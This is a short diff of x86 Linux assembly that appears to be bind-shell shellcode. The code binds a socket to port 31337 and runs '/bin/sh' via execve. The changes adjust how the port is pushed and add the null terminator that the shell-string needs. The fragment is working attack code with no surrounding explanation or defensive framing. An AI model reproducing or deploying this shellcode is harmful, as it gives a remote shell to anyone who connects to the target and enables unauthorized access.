@@ -38,7 +38,7 @@ _start:
 
 	mov	bl, 0x2		;; SYS_BIND function
 	push	edx		;; push edx (value: 0) for sin_addr (INADDR_ENY), as third param
-	push word 0x697A	;; push 31337 (reversed hex) for sin_port, as second param
+	push	0x697A		;; push 31337 (reversed hex) for sin_port, as second param
 	push	bx		;; push ebx (value: 2) for AF_INET, as first param
 	mov	ecx, esp	;; moving reference as srv_addr structure 
 	push	0x10		;; address length, see sizeof(srv_addr)
@@ -96,6 +96,8 @@ _start:
 
 	;;execve( "/bin/sh", NULL, NULL );
 	mov	al, 0x0b	;syscall: sys_execve
+	xor	ebx, ebx	;give ebx null
+	push	ebx		;for null terminator
 	push	0x68732f2f	;String "hs//"
 	push	0x6e69622f	;String "nib/"
 	mov	ebx, esp	;move current stack pointer to ebx as second param
